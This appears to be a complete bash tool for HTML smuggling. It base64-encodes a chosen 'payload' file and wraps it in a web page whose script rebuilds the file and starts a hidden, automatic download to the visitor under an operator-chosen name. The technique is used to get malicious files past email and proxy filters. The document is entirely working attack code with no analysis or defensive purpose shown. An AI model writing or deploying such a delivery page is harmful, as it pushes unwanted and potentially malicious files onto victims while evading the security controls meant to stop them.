#!/bin/bash

if [ $# -lt 2 ]
then
    echo "Usage : $0 <payload_path> <output_name>"
    exit 1
fi

payload_path=$1
output_name=$2
payload_b64=$(base64 -w0 "$1")

# Write the html page
cat <<EOF >> blob.html
<html>
		<body>
				<script>
						function base64ToArrayBuffer(base64) {
						var binary_string = window.atob(base64);
						var len = binary_string.length;
						var bytes = new Uint8Array( len );
						for (var i = 0; i < len; i++) { 
								bytes[i] = binary_string.charCodeAt(i);
						}
								return bytes.buffer;
						}
						var file = '$payload_b64';
						var data = base64ToArrayBuffer(file);
						var blob = new Blob([data], {type: 'octet/stream'});
						var fileName = '$output_name';
						var a = document.createElement('a');
						document.body.appendChild(a);
						a.style = 'display: none';
						var url = window.URL.createObjectURL(blob);
						a.href = url;
						a.download = fileName;
						a.click();
						window.URL.revokeObjectURL(url);
				</script>
		</body>
</html>
EOF
